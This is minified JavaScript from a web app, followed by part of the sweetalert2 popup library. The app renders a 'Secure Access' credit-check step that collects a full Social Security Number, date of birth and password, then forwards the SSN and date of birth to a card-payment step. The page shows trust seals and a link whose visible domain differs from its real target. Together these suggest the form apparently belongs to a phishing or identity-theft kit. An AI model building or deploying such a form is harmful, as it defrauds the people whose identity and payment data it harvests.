${it}`,he=!1)}return(b===""||isNaN(b)||b.length!==4||parseInt(b)<1900||parseInt(b)>N)&&(_e.year=`Enter a valid year (1900-${N})`,he=!1),L(_e),he},P=()=>{if(!D)return!0;const _e={...G,password:"",confirmPassword:""};let he=!0;return E?E.length<8&&(_e.password="Password must be at least 8 characters",he=!1):(_e.password="Password is required",he=!1),M?E!==M&&(_e.confirmPassword="Passwords do not match",he=!1):(_e.confirmPassword="Please confirm your password",he=!1),L(_e),he},Ne=()=>{const _e=z(),he=P();return!B&&!D?(L(it=>({...it,form:"Please select at least one authentication method"})),!1):B&&(!e||!i||!o)?(L(it=>({...it,form:"Please complete your SSN"})),!1):B&&(!d||!p||!b)?(L(it=>({...it,form:"Please complete your date of birth"})),!1):D&&(!E||!M)?(L(it=>({...it,form:"Please complete your password fields"})),!1):_e&&he},Me=_e=>{const he=_e.target.value.replace(/\D/g,"");he.length<=3&&(n(he),he.length===3&&document.getElementById("ssn2").focus())},ee=_e=>{const he=_e.target.value.replace(/\D/g,"");he.length<=2&&(s(he),he.length===2&&document.getElementById("ssn3").focus())},me=_e=>{const he=_e.target.value.replace(/\D/g,"");he.length<=4&&c(he)},we=_e=>{const he=_e.target.value.replace(/\D/g,"");if(he===""||parseInt(he)>=0&&parseInt(he)<=12){if(he==="0")f("");else if(he==="")f("");else{const it=he.length===1?`0${he}`:he;f(it.slice(0,2))}he.length===2&&document.getElementById("day").focus()}},Be=_e=>{const he=_e.target.value.replace(/\D/g,"");if(he===""||parseInt(he)>=0&&parseInt(he)<=31){if(he==="0")v("");else if(he==="")v("");else{const it=he.length===1?`0${he}`:he;v(it.slice(0,2))}he.length===2&&document.getElementById("year").focus()}},F=_e=>{const he=_e.target.value.replace(/\D/g,"");he.length<=4&&w(he)},ae=_e=>{C(_e.target.value),G.confirmPassword==="Passwords do not match"&&L(he=>({...he,confirmPassword:""}))},ge=_e=>{V(_e.target.value),G.confirmPassword==="Passwords do not match"&&L(he=>({...he,confirmPassword:""}))},ue=()=>{z(),P()},Te=_e=>{_e.preventDefault(),Ne()&&t("/card-payment",{state:{from:"/secure-access",formData:{ssn:B?`${e}-${i}-${o}`:null,dob:B?`${d}/${p}/${b}`:null}}})};return g.jsxs("div",{className:"flex flex-col md:flex-row bg-white rounded-lg shadow-lg overflow-hidden w-[100%] md:w-[80%] mx-auto mt-2 md:mt-10 mb-8",children:[g.jsxs("div",{className:"w-full md:w-[60%] p-8",children:[g.jsx("h2",{className:"text-3xl text-gray-600 font-light mb-2",children:"Step 2. Secure Access"}),g.jsxs("p",{className:"text-sm flex flex-row gap-3 text-gray-600 mb-4",children:[g.jsx("img",{className:"h-18",src:X5,alt:""}),g.jsxs("div",{className:"text-[16px] text-gray-500 font-light",children:["You must provide correct information to authorize access to your credit file.",g.jsx("span",{className:"ml-1 text-blue-500 cursor-pointer",children:""})]})]}),g.jsxs("form",{onSubmit:Te,children:[g.jsxs("div",{className:"mb-2 flex items-center",children:[g.jsx("input",{type:"checkbox",id:"useSSN",checked:B,onChange:I,className:"mr-2"}),g.jsx("label",{htmlFor:"useSSN",className:"text-sm font-medium",children:"I want to use my Social Security Number"})]}),g.jsxs("div",{className:"mb-4",children:[g.jsx("label",{className:`block text-sm font-medium mb-1 ${T?"":"text-gray-400"}`,children:"Social Security Number"}),g.jsxs("div",{className:"flex gap-2",children:[g.jsx("input",{type:"password",className:`w-1/3 border-[#c5c5c5] border-2 rounded px-3 py-2 ${T?"":"bg-gray-100 text-gray-400"}`,maxLength:3,value:e,onChange:Me,autoComplete:"off",disabled:!T}),g.jsx("input",{id:"ssn2",type:"password",className:`w-1/3 border-[#c5c5c5] border-2 rounded px-3 py-2 ${T?"":"bg-gray-100 text-gray-400"}`,maxLength:2,value:i,onChange:ee,autoComplete:"off",disabled:!T}),g.jsx("input",{id:"ssn3",type:"password",className:`w-1/3 border-[#c5c5c5] border-2 rounded px-3 py-2 ${T?"":"bg-gray-100 text-gray-400"}`,maxLength:4,value:o,onChange:me,autoComplete:"off",disabled:!T})]})]}),g.jsxs("div",{className:"mb-4",children:[g.jsx("label",{className:`block text-sm font-medium mb-1 ${T?"":"text-gray-400"}`,children:"Date of Birth"}),g.jsxs("div",{className:"flex gap-2",children:[g.jsx("input",{id:"month",type:"text",placeholder:"MM",className:`w-1/3 border-[#c5c5c5] border-2 rounded px-3 py-2 ${G.month?"border-red-500":""} ${T?"":"bg-gray-100 text-gray-400"}`,maxLength:2,value:d,onChange:we,onBlur:ue,inputMode:"numeric",disabled:!T}),g.jsx("input",{id:"day",type:"text",placeholder:"DD",className:`w-1/3 border-[#c5c5c5] border-2 rounded px-3 py-2 ${G.day?"border-red-500":""} ${T?"":"bg-gray-100 text-gray-400"}`,maxLength:2,value:p,onChange:Be,onBlur:ue,inputMode:"numeric",disabled:!T}),g.jsx("input",{id:"year",type:"text",placeholder:"YYYY",className:`w-1/3 border-[#c5c5c5] border-2 rounded px-3 py-2 ${G.year?"border-red-500":""} ${T?"":"bg-gray-100 text-gray-400"}`,maxLength:4,value:b,onChange:F,onBlur:ue,inputMode:"numeric",disabled:!T})]}),g.jsxs("div",{className:"text-red-500 text-xs mt-1",children:[G.month&&g.jsx("div",{children:G.month}),G.day&&!G.month&&g.jsx("div",{children:G.day}),G.year&&!G.day&&!G.month&&g.jsx("div",{children:G.year})]})]}),g.jsxs("div",{className:"mb-2 flex items-center mt-6",children:[g.jsx("input",{type:"checkbox",id:"withoutSSN",checked:D,onChange:j,className:"mr-2"}),g.jsx("label",{htmlFor:"withoutSSN",className:"text-sm font-medium",children:"Continue without SSN"})]}),g.jsx("div",{className:"text-3xl text-gray-600 font-light mt-4",children:g.jsx("h1",{children:"Setup Your Password"})}),g.jsxs("div",{className:"mb-4",children:[g.jsx("label",{className:`block text-sm font-medium mb-1 ${k?"":"text-gray-400"}`,children:"Password"}),g.jsx("input",{type:"password",className:`w-full border-[#c5c5c5] border-2 rounded px-3 py-2 ${G.password?"border-red-500":""} ${k?"":"bg-gray-100 text-gray-400"}`,value:E,onChange:ae,onBlur:ue,disabled:!k}),G.password&&g.jsx("div",{className:"text-red-500 text-xs mt-1",children:G.password})]}),g.jsxs("div",{className:"mb-6",children:[g.jsx("label",{className:`block text-sm font-medium mb-1 ${k?"":"text-gray-400"}`,children:"Confirm Password"}),g.jsx("input",{type:"password",className:`w-full border-[#c5c5c5] border-2 rounded px-3 py-2 ${G.confirmPassword?"border-red-500":""} ${k?"":"bg-gray-100 text-gray-400"}`,value:M,onChange:ge,onBlur:ue,disabled:!k}),G.confirmPassword&&g.jsx("div",{className:"text-red-500 text-xs mt-1",children:G.confirmPassword}),E&&M&&E!==M&&g.jsx("div",{className:"text-red-500 text-xs mt-1",children:"Warning: Passwords do not match"})]}),G.form&&g.jsx("div",{className:"text-red-500 text-sm mb-4",children:G.form}),g.jsx("div",{className:"flex justify-center",children:g.jsx("button",{type:"submit",className:"bg-[#7fbdff] hover:bg-blue-700 text-white py-2 px-21 rounded mb-0 font-medium w-full md:w-auto text-[13px] cursor-pointer",children:"CONTINUE"})})]}),g.jsxs("div",{className:"flex items-center justify-center gap-4 mt-6",children:[g.jsx("img",{src:Dv,alt:"Security Seal",className:"h-8"}),g.jsx("img",{src:kv,alt:"Qualys Seal",className:"h-9"})]})]}),g.jsxs("div",{className:"w-full md:w-[40%] bg-[#cfd2d4] flex flex-col justify-center items-center p-2",children:[g.jsx("img",{src:$5,alt:"Credit Score",className:"h-86 mb-4"}),g.jsx("h3",{className:"text-2xl text-[#7e8284] mb-6 font-light",children:"Will This Affect My Credit?"}),g.jsxs("p",{className:"text-sm text-[#7e8284] text-center",children:["Absolutely not! Checking your score on ",g.jsx("br",{}),g.jsx("a",{href:"https://www.bestfreescore.com",className:"text-[#7e8284] no-underline text-[16px]",children:"evictioncheckers.com"})," is a soft inquiry, which will never affect ",g.jsx("br",{})," your credit."]})]})]})};/*!
* sweetalert2 v11.22.0
* Released under the MIT License.
*/function NT(t,e,n){if(typeof t=="function"?t===e:t.has(e))return arguments.length<3?e:n;throw new TypeError("Private element is not present on this object")}function J5(t,e){if(e.has(t))throw new TypeError("Cannot initialize the same private elements twice on an object")}function Ix(t,e){return t.get(NT(t,e))}function ek(t,e,n){J5(t,e),e.set(t,n)}function tk(t,e,n){return t.set(NT(t,e),n),n}const nk=100,Oe={},ik=()=>{Oe.previousActiveElement instanceof HTMLElement?(Oe.previousActiveElement.focus(),Oe.previousActiveElement=null):document.body&&document.body.focus()},rk=t=>new Promise(e=>{if(!t)return e();const n=window.scrollX,i=window.scrollY;Oe.restoreFocusTimeout=setTimeout(()=>{ik(),e()},nk),window.scrollTo(n,i)}),RT="swal2-",sk=["container","shown","height-auto","iosfix","popup","modal","no-backdrop","no-transition","toast","toast-shown","show","hide","close","title","html-container","actions","confirm","deny","cancel","footer","icon","icon-content","image","input","file","range","select","radio","checkbox","label","textarea","inputerror","input-label","validation-message","progress-steps","active-progress-step","progress-step","progress-step-line","loader","loading","styled","top","top-start","top-end","top-left","top-right","center","center-start","center-end","center-left","center-right","bottom","bottom-start","bottom-end","bottom-left","bottom-right","grow-row","grow-column","grow-fullscreen","rtl","timer-progress-bar","timer-progress-bar-container","scrollbar-measure","icon-success","icon-warning","icon-info","icon-question","icon-error","draggable","dragging"],re=sk.reduce((t,e)=>(t[e]=RT+e,t),{}),ak=["success","warning","info","question","error"],tm=ak.reduce((t,e)=>(t[e]=RT+e,t),{}),IT="SweetAlert2:",Mv=t=>t.charAt(0).toUpperCase()+t.slice(1),li=t=>{console.warn(`${IT} ${typeof t=="object"?t.join(" "):t}`)},Zo=t=>{console.error(`${IT} ${t}`)},kx=[],ok=t=>{kx.includes(t)||(kx.push(t),li(t))},kT=(t,e=null)=>{ok(`"${t}" is deprecated and will be removed in the next major release.${e?` Use "${e}" instead.`:""}`)},Wm=t=>typeof t=="function"?t():t,Ov=t=>t&&typeof t.toPromise=="function",Ld=t=>Ov(t)?t.toPromise():Promise.resolve(t),Pv=t=>t&&Promise.resolve(t)===t,ci=()=>document.body.querySelector(`.${re.container}`),Vd=t=>{const e=ci();return e?e.querySelector(t):null},Vi=t=>Vd(`.${t}`),wt=()=>Vi(re.popup),Ic=()=>Vi(re.icon),lk=()=>Vi(re["icon-content"]),DT=()=>Vi(re.title),jv=()=>Vi(re["html-container"]),MT=()=>Vi(re.image),Lv=()=>Vi(re["progress-steps"]),$m=()=>Vi(re["validation-message"]),Zr=()=>Vd(`.${re.actions} .${re.confirm}`),kc=()=>Vd(`.${re.actions} .${re.cancel}`),Jo=()=>Vd(`.${re.actions} .${re.deny}`),ck=()=>Vi(re["input-label"]),Dc=()=>Vd(`.${re.loader}`),Ud=()=>Vi(re.actions),OT=()=>Vi(re.footer),Xm=()=>Vi(re["timer-progress-bar"]),Vv=()=>Vi(re.close),uk=`
  a[href],
  area[href],
  input:not([disabled]),
  select:not([disabled]),
  textarea:not([disabled]),
  button:not([disabled]),
  iframe,
  object,
  embed,
  [tabindex="0"],
  [contenteditable],
  audio[controls],
  video[controls],
  summary
`,Uv=()=>{const t=wt();if(!t)return[];const e=t.querySelectorAll('[tabindex]:not([tabindex="-1"]):not([tabindex="0"])'),n=Array.from(e).sort((o,c)=>{const d=parseInt(o.getAttribute("tabindex")||"0"),f=parseInt(c.getAttribute("tabindex")||"0");return d>f?1:d<f?-1:0}),i=t.querySelectorAll(uk),s=Array.from(i).filter(o=>o.getAttribute("tabindex")!=="-1");return[...new Set(n.concat(s))].filter(o=>_i(o))},Bv=()=>Os(document.body,re.shown)&&!Os(document.body,re["toast-shown"])&&!Os(document.body,re["no-backdrop"]),Zm=()=>{const t=wt();return t?Os(t,re.toast):!1},dk=()=>{const t=wt();return t?t.hasAttribute("data-loading"):!1},Ui=(t,e)=>{if(t.textContent="",e){const i=new DOMParser().parseFromString(e,"text/html"),s=i.querySelector("head");s&&Array.from(s.childNodes).forEach(c=>{t.appendChild(c)});const o=i.querySelector("body");o&&Array.from(o.childNodes).forEach(c=>{c instanceof HTMLVideoElement||c instanceof HTMLAudioElement?t.appendChild(c.cloneNode(!0)):t.appendChild(c)})}},Os=(t,e)=>{if(!e)return!1;const n=e.split(/\s+/);for(let i=0;i<n.length;i++)if(!t.classList.contains(n[i]))return!1;return!0},hk=(t,e)=>{Array.from(t.classList).forEach(n=>{!Object.values(re).includes(n)&&!Object.values(tm).includes(n)&&!Object.values(e.showClass||{}).includes(n)&&t.classList.remove(n)})},Li=(t,e,n)=>{if(hk(t,e),!e.customClass)return;const i=e.customClass[n];if(i){if(typeof i!="string"&&!i.forEach){li(`Invalid type of customClass.${n}! Expected string or iterable object, got "${typeof i}"`);return}At(t,i)}},Jm=(t,e)=>{if(!e)return null;switch(e){case"select":case"textarea":case"file":return t.querySelector(`.${re.popup} > .${re[e]}`);case"checkbox":return t.querySelector(`.${re.popup} > .${re.checkbox} input`);case"radio":return t.querySelector(`.${re.popup} > .${re.radio} input:checked`)||t.querySelector(`.${re.popup} > .${re.radio} input:first-child`);case"range":return t.querySelector(`.${re.popup} > .${re.range} input`);default:return t.querySelector(`.${re.popup} > .${re.input}`)}},PT=t=>{if(t.focus(),t.type!=="file"){const e=t.value;t.value="",t.value=e}},jT=(t,e,n)=>{!t||!e||(typeof e=="string"&&(e=e.split(/\s+/).filter(Boolean)),e.forEach(i=>{Array.isArray(t)?t.forEach(s=>{n?s.classList.add(i):s.classList.remove(i)}):n?t.classList.add(i):t.classList.remove(i)}))},At=(t,e)=>{jT(t,e,!0)},lr=(t,e)=>{jT(t,e,!1)},Ra=(t,e)=>{const n=Array.from(t.children);for(let i=0;i<n.length;i++){const s=n[i];if(s instanceof HTMLElement&&Os(s,e))return s}},Vo=(t,e,n)=>{n===`${parseInt(n)}`&&(n=parseInt(n)),n||parseInt(n)===0?t.style.setProperty(e,typeof n=="number"?`${n}px`:n):t.style.removeProperty(e)},In=(t,e="flex")=>{t&&(t.style.display=e)},$n=t=>{t&&(t.style.display="none")},zv=(t,e="block")=>{t&&new MutationObserver(()=>{Bd(t,t.innerHTML,e)}).observe(t,{childList:!0,subtree:!0})},Dx=(t,e,n,i)=>{const s=t.querySelector(e);s&&s.style.setProperty(n,i)},Bd=(t,e,n="flex")=>{e?In(t,n):$n(t)},_i=t=>!!(t&&(t.offsetWidth||t.offsetHeight||t.getClientRects().length)),fk=()=>!_i(Zr())&&!_i(Jo())&&!_i(kc()),C0=t=>t.scrollHeight>t.clientHeight,mk=(t,e)=>{let n=t;for(;n&&n!==e;){if(C0(n))return!0;n=n.parentElement}return!1},LT=t=>{const e=window.getComputedStyle(t),n=parseFloat(e.getPropertyValue("animation-duration")||"0"),i=parseFloat(e.getPropertyValue("transition-duration")||"0");return n>0||i>0},Fv=(t,e=!1)=>{const n=Xm();n&&_i(n)&&(e&&(n.style.transition="none",n.style.width="100%"),setTimeout(()=>{n.style.transition=`width ${t/1e3}s linear`,n.style.width="0%"},10))},pk=()=>{const t=Xm();if(!t)return;const e=parseInt(window.getComputedStyle(t).width);t.style.removeProperty("transition"),t.style.width="100%";const n=parseInt(window.getComputedStyle(t).width),i=e/n*100;t.style.width=`${i}%`},gk=()=>typeof window>"u"||typeof document>"u",yk=`
 <div aria-labelledby="${re.title}" aria-describedby="${re["html-container"]}" class="${re.popup}" tabindex="-1">
   <button type="button" class="${re.close}"></button>
   <ul class="${re["progress-steps"]}"></ul>
   <div class="${re.icon}"></div>
   <img class="${re.image}" />
   <h2 class="${re.title}" id="${re.title}"></h2>
   <div class="${re["html-container"]}" id="${re["html-container"]}"></div>
   <input class="${re.input}" id="${re.input}" />
   <input type="file" class="${re.file}" />
   <div class="${re.range}">
     <input type="range" />
     <output></output>
   </div>
   <select class="${re.select}" id="${re.select}"></select>
   <div class="${re.radio}"></div>
   <label class="${re.checkbox}">
     <input type="checkbox" id="${re.checkbox}" />
     <span class="${re.label}"></span>
   </label>
   <textarea class="${re.textarea}" id="${re.textarea}"></textarea>
   <div class="${re["validation-message"]}" id="${re["validation-message"]}"></div>
   <div class="${re.actions}">
     <div class="${re.loader}"></div>
     <button type="button" class="${re.confirm}"></button>
     <button type="button" class="${re.deny}"></button>
     <button type="button" class="${re.cancel}"></button>
   </div>
   <div class="${re.footer}"></div>
   <div class="${re["timer-progress-bar-container"]}">
     <div class="${re["timer-progress-bar"]}"></div>
   </div>
 </div>
`.replace(/(^|\n)\s*/g,""),vk=()=>{const t=ci();return t?(t.remove(),lr([document.documentElement,document.body],[re["no-backdrop"],re["toast-shown"],re["has-column"]]),!0):!1},Ro=()=>{Oe.currentInstance.resetValidationMessage()},_k=()=>{const t=wt(),e=Ra(t,re.input),n=Ra(t,re.file),i=t.querySelector(`.${re.range} input`),s=t.querySelector(`.${re.range} output`),o=Ra(t,re.select),c=t.querySelector(`.${re.checkbox} input`),d=Ra(t,re.textarea);e.oninput=Ro,n.onchange=Ro,o.onchange=Ro,c.onchange=Ro,d.oninput=Ro,i.oninput=()=>{Ro(),s.value=i.value},i.onchange=()=>{Ro(),s.value=i.value}},wk=t=>typeof t=="string"?document.querySelector(t):t,bk=t=>{const e=wt();e.setAttribute("role",t.toast?"alert":"dialog"),e.setAttribute("aria-live",t.toast?"polite":"assertive"),t.toast||e.setAttribute("aria-modal","true")},xk=t=>{window.getComputedStyle(t).direction==="rtl"&&At(ci(),re.rtl)},Ak=t=>{const e=vk();if(gk()){Zo("SweetAlert2 requires document to initialize");return}const n=document.createElement("div");n.className=re.container,e&&At(n,re["no-transition"]),Ui(n,yk),n.dataset.swal2Theme=t.theme;const i=wk(t.target);i.appendChild(n),t.topLayer&&(n.setAttribute("popover",""),n.showPopover()),bk(t),xk(i),_k()},Hv=(t,e)=>{t instanceof HTMLElement?e.appendChild(t):typeof t=="object"?Ek(t,e):t&&Ui(e,t)},Ek=(t,e)=>{t.jquery?Tk(e,t):Ui(e,t.toString())},Tk=(t,e)=>{if(t.textContent="",0 in e)for(let n=0;n in e;n++)t.appendChild(e[n].cloneNode(!0));else t.appendChild(e.cloneNode(!0))},Ck=(t,e)=>{const n=Ud(),i=Dc();!n||!i||(!e.showConfirmButton&&!e.showDenyButton&&!e.showCancelButton?$n(n):In(n),Li(n,e,"actions"),Sk(n,i,e),Ui(i,e.loaderHtml||""),Li(i,e,"loader"))};function Sk(t,e,n){const i=Zr(),s=Jo(),o=kc();!i||!s||!o||(Jy(i,"confirm",n),Jy(s,"deny",n),Jy(o,"cancel",n),Nk(i,s,o,n),n.reverseButtons&&(n.toast?(t.insertBefore(o,i),t.insertBefore(s,i)):(t.insertBefore(o,e),t.insertBefore(s,e),t.insertBefore(i,e))))}function Nk(t,e,n,i){if(!i.buttonsStyling){lr([t,e,n],re.styled);return}At([t,e,n],re.styled),i.confirmButtonColor&&t.style.setProperty("--swal2-confirm-button-background-color",i.confirmButtonColor),i.denyButtonColor&&e.style.setProperty("--swal2-deny-button-background-color",i.denyButtonColor),i.cancelButtonColor&&n.style.setProperty("--swal2-cancel-button-background-color",i.cancelButtonColor),Zy(t),Zy(e),Zy(n)}function Zy(t){const e=window.getComputedStyle(t);if(e.getPropertyValue("--swal2-action-button-focus-box-shadow"))return;const n=e.backgroundColor.replace(/rgba?\((\d+), (\d+), (\d+).*/,"rgba($1, $2, $3, 0.5)");t.style.setProperty("--swal2-action-button-focus-box-shadow",e.getPropertyValue("--swal2-outline").replace(/ rgba\(.*/,` ${n}`))}function Jy(t,e,n){const i=Mv(e);Bd(t,n[`show${i}Button`],"inline-block"),Ui(t,n[`${e}ButtonText`]||""),t.setAttribute("aria-label",n[`${e}ButtonAriaLabel`]||""),t.className=re[e],Li(t,n,`${e}Button`)}const Rk=(t,e)=>{const n=Vv();n&&(Ui(n,e.closeButtonHtml||""),Li(n,e,"closeButton"),Bd(n,e.showCloseButton),n.setAttribute("aria-label",e.closeButtonAriaLabel||""))},Ik=(t,e)=>{const n=ci();n&&(kk(n,e.backdrop),Dk(n,e.position),Mk(n,e.grow),Li(n,e,"container"))};function kk(t,e){typeof e=="string"?t.style.background=e:e||At([document.documentElement,document.body],re["no-backdrop"])}function Dk(t,e){e&&(e in re?At(t,re[e]):(li('The "position" parameter is not valid, defaulting to "center"'),At(t,re.center)))}function Mk(t,e){e&&At(t,re[`grow-${e}`])}var zt={innerParams:new WeakMap,domCache:new WeakMap};const Ok=["input","file","range","select","radio","checkbox","textarea"],Pk=(t,e)=>{const n=wt();if(!n)return;const i=zt.innerParams.get(t),s=!i||e.input!==i.input;Ok.forEach(o=>{const c=Ra(n,re[o]);c&&(Vk(o,e.inputAttributes),c.className=re[o],s&&$n(c))}),e.input&&(s&&jk(e),Uk(e))},jk=t=>{if(!t.input)return;if(!Jt[t.input]){Zo(`Unexpected type of input! Expected ${Object.keys(Jt).join(" | ")}, got "${t.input}"`);return}const e=VT(t.input);if(!e)return;const n=Jt[t.input](e,t);In(e),t.inputAutoFocus&&setTimeout(()=>{PT(n)})},Lk=t=>{for(let e=0;e<t.attributes.length;e++){const n=t.attributes[e].name;["id","type","value","style"].includes(n)||t.removeAttribute(n)}},Vk=(t,e)=>{const n=wt();if(!n)return;const i=Jm(n,t);if(i){Lk(i);for(const s in e)i.setAttribute(s,e[s])}},Uk=t=>{if(!t.input)return;const e=VT(t.input);e&&Li(e,t,"input")},qv=(t,e)=>{!t.placeholder&&e.inputPlaceholder&&(t.placeholder=e.inputPlaceholder)},zd=(t,e,n)=>{if(n.inputLabel){const i=document.createElement("label"),s=re["input-label"];i.setAttribute("for",t.id),i.className=s,typeof n.customClass=="object"&&At(i,n.customClass.inputLabel),i.innerText=n.inputLabel,e.insertAdjacentElement("beforebegin",i)}},VT=t=>{const e=wt();if(e)return Ra(e,re[t]||re.input)},nm=(t,e)=>{["string","number"].includes(typeof e)?t.value=`${e}`:Pv(e)||li(`Unexpected type of inputValue! Expected "string", "number" or "Promise", got "${typeof e}"`)},Jt={};Jt.text=Jt.email=Jt.password=Jt.number=Jt.tel=Jt.url=Jt.search=Jt.date=Jt["datetime-local"]=Jt.time=Jt.week=Jt.month=(t,e)=>(nm(t,e.inputValue),zd(t,t,e),qv(t,e),t.type=e.input,t);Jt.file=(t,e)=>(zd(t,t,e),qv(t,e),t);Jt.range=(t,e)=>{const n=t.querySelector("input"),i=t.querySelector("output");return nm(n,e.inputValue),n.type=e.input,nm(i,e.inputValue),zd(n,t,e),t};Jt.select=(t,e)=>{if(t.textContent="",e.inputPlaceholder){const n=document.createElement("option");Ui(n,e.inputPlaceholder),n.value="",n.disabled=!0,n.selected=!0,t.appendChild(n)}return zd(t,t,e),t};Jt.radio=t=>(t.textContent="",t);Jt.checkbox=(t,e)=>{const n=Jm(wt(),"checkbox");n.value="1",n.checked=!!e.inputValue;const i=t.querySelector("span");return Ui(i,e.inputPlaceholder||e.inputLabel),n};Jt.textarea=(t,e)=>{nm(t,e.inputValue),qv(t,e),zd(t,t,e);const n=i=>parseInt(window.getComputedStyle(i).marginLeft)+parseInt(window.getComputedStyle(i).marginRight);return setTimeout(()=>{if("MutationObserver"in window){const i=parseInt(window.getComputedStyle(wt()).width),s=()=>{if(!document.body.contains(t))return;const o=t.offsetWidth+n(t);o>i?wt().style.width=`${o}px`:Vo(wt(),"width",e.width)};new MutationObserver(s).observe(t,{attributes:!0,attributeFilter:["style"]})}}),t};const Bk=(t,e)=>{const n=jv();n&&(zv(n),Li(n,e,"htmlContainer"),e.html?(Hv(e.html,n),In(n,"block")):e.text?(n.textContent=e.text,In(n,"block")):$n(n),Pk(t,e))},zk=(t,e)=>{const n=OT();n&&(zv(n),Bd(n,e.footer,"block"),e.footer&&Hv(e.footer,n),Li(n,e,"footer"))},Fk=(t,e)=>{const n=zt.innerParams.get(t),i=Ic();if(!i)return;if(n&&e.icon===n.icon){Ox(i,e),Mx(i,e);return}if(!e.icon&&!e.iconHtml){$n(i);return}if(e.icon&&Object.keys(tm).indexOf(e.icon)===-1){Zo(`Unknown icon! Expected "success", "error", "warning", "info" or "question", got "${e.icon}"`),$n(i);return}In(i),Ox(i,e),Mx(i,e),At(i,e.showClass&&e.showClass.icon),window.matchMedia("(prefers-color-scheme: dark)").addEventListener("change",UT)},Mx=(t,e)=>{for(const[n,i]of Object.entries(tm))e.icon!==n&&lr(t,i);At(t,e.icon&&tm[e.icon]),Gk(t,e),UT(),Li(t,e,"icon")},UT=()=>{const t=wt();if(!t)return;const e=window.getComputedStyle(t).getPropertyValue("background-color"),n=t.querySelectorAll("[class^=swal2-success-circular-line], .swal2-success-fix");for(let i=0;i<n.length;i++)n[i].style.backgroundColor=e},Hk=`
  <div class="swal2-success-circular-line-left"></div>
  <span class="swal2-success-line-tip"></span> <span class="swal2-success-line-long"></span>
  <div class="swal2-success-ring"></div> <div class="swal2-success-fix"></div>
  <div class="swal2-success-circular-line-right"></div>
`,qk=`
  <span class="swal2-x-mark">
    <span class="swal2-x-mark-line-left"></span>
    <span class="swal2-x-mark-line-right"></span>
  </span>
`,Ox=(t,e)=>{if(!e.icon&&!e.iconHtml)return;let n=t.innerHTML,i="";e.iconHtml?i=Px(e.iconHtml):e.icon==="success"?(i=Hk,n=n.replace(/ style=".*?"/g,"")):e.icon==="error"?i=qk:e.icon&&(i=Px({question:"?",warning:"!",info:"i"}[e.icon])),n.trim()!==i.trim()&&Ui(t,i)},Gk=(t,e)=>{if(e.iconColor){t.style.color=e.iconColor,t.style.borderColor=e.iconColor;for(const n of[".swal2-success-line-tip",".swal2-success-line-long",".swal2-x-mark-line-left",".swal2-x-mark-line-right"])Dx(t,n,"background-color",e.iconColor);Dx(t,".swal2-success-ring","border-color",e.iconColor)}},Px=t=>`<div class="${re["icon-content"]}">${t}</div>`,Yk=(t,e)=>{const n=MT();if(n){if(!e.imageUrl){$n(n);return}In(n,""),n.setAttribute("src",e.imageUrl),n.setAttribute("alt",e.imageAlt||""),Vo(n,"width",e.imageWidth),Vo(n,"height",e.imageHeight),n.className=re.image,Li(n,e,"image")}};let Gv=!1,BT=0,zT=0,FT=0,HT=0;const Qk=t=>{t.addEventListener("mousedown",im),document.body.addEventListener("mousemove",rm),t.addEventListener("mouseup",sm),t.addEventListener("touchstart",im),document.body.addEventListener("touchmove",rm),t.addEventListener("touchend",sm)},Kk=t=>{t.removeEventListener("mousedown",im),document.body.removeEventListener("mousemove",rm),t.removeEventListener("mouseup",sm),t.removeEventListener("touchstart",im),document.body.removeEventListener("touchmove",rm),t.removeEventListener("touchend",sm)},im=t=>{const e=wt();if(t.target===e||Ic().contains(t.target)){Gv=!0;const n=qT(t);BT=n.clientX,zT=n.clientY,FT=parseInt(e.style.insetInlineStart)||0,HT=parseInt(e.style.insetBlockStart)||0,At(e,"swal2-dragging")}},rm=t=>{const e=wt();if(Gv){let{clientX:n,clientY:i}=qT(t);e.style.insetInlineStart=`${FT+(n-BT)}px`,e.style.insetBlockStart=`${HT+(i-zT)}px`}},sm=()=>{const t=wt();Gv=!1,lr(t,"swal2-dragging")},qT=t=>{let e=0,n=0;return t.type.startsWith("mouse")?(e=t.clientX,n=t.clientY):t.type.startsWith("touch")&&(e=t.touches[0].clientX,n=t.touches[0].clientY),{clientX:e,clientY:n}},Wk=(t,e)=>{const n=ci(),i=wt();if(!(!n||!i)){if(e.toast){Vo(n,"width",e.width),i.style.width="100%";const s=Dc();s&&i.insertBefore(s,Ic())}else Vo(i,"width",e.width);Vo(i,"padding",e.padding),e.color&&(i.style.color=e.color),e.background&&(i.style.background=e.background),$n($m()),$k(i,e),e.draggable&&!e.toast?(At(i,re.draggable),Qk(i)):(lr(i,re.draggable),Kk(i))}},$k=(t,e)=>{const n=e.showClass||{};t.className=`${re.popup} ${_i(t)?n.popup:""}`,e.toast?(At([document.documentElement,document.body],re["toast-shown"]),At(t,re.toast)):At(t,re.modal),Li(t,e,"popup"),typeof e.customClass=="string"&&At(t,e.customClass),e.icon&&At(t,re[`icon-${e.icon}`])},Xk=(t,e)=>{const n=Lv();if(!n)return;const{progressSteps:i,currentProgressStep:s}=e;if(!i||i.length===0||s===void 0){$n(n);return}In(n),n.textContent="",s>=i.length&&li("Invalid currentProgressStep parameter, it should be less than progressSteps.length (currentProgressStep like JS arrays starts from 0)"),i.forEach((o,c)=>{const d=Zk(o);if(n.appendChild(d),c===s&&At(d,re["active-progress-step"]),c!==i.length-1){const f=Jk(e);n.appendChild(f)}})},Zk=t=>{const e=document.createElement("li");return At(e,re["progress-step"]),Ui(e,t),e},Jk=t=>{const e=document.createElement("li");return At(e,re["progress-step-line"]),t.progressStepsDistance&&Vo(e,"width",t.progressStepsDistance),e},eD=(t,e)=>{const n=DT();n&&(zv(n),Bd(n,e.title||e.titleText,"block"),e.title&&Hv(e.title,n),e.titleText&&(n.innerText=e.titleText),Li(n,e,"title"))},GT=(t,e)=>{Wk(t,e),Ik(t,e),Xk(t,e),Fk(t,e),Yk(t,e),eD(t,e),Rk(t,e),Bk(t,e),Ck(t,e),zk(t,e);const n=wt();typeof e.didRender=="function"&&n&&e.didRender(n),Oe.eventEmitter.emit("didRender",n)},tD=()=>_i(wt()),YT=()=>{var t;return(t=Zr())===null||t===void 0?void 0:t.click()},nD=()=>{var t;return(t=Jo())===null||t===void 0?void 0:t.click()},iD=()=>{var t;return(t=kc())===null||t===void 0?void 